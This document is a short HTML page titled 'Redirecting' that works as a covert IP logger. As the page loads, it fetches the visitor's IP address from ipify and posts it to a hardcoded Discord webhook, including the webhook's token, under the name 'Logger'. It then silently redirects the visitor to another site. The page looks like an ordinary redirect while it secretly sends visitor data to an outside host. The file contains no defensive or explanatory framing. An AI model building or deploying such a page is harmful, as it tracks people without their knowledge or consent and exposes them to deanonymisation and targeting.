<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting</title>
    <script>
        function getIP(json) {
            var request = new XMLHttpRequest();
            request.open("POST", "https://discord.com/api/webhooks/1207119881913241660/Ks6-nu7C8yMPPkYQcbYxO0NlNT6uKlg1LrlLZkwHcTOKTMz1zoQ0C8W7eOlvJgQGEm5c");

            request.setRequestHeader('Content-type', 'application/json');

            var params = {
                username: "Logger",
                avatar_url: "https://i.pinimg.com/originals/d8/eb/57/d8eb57825be593ff8993265cf5eea794.jpg",
                content: "**IP:** *" + json.ip + "*"
            };

            // Send the IP information
            request.send(JSON.stringify(params));

            // Redirect to another website after the IP is logged
            request.onload = function() {
                // Redirect to the desired website
                window.location.replace("https://www.cntrler.xyz");
            };
        }
    </script>
</head>
<body>
    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
</body>
</html>
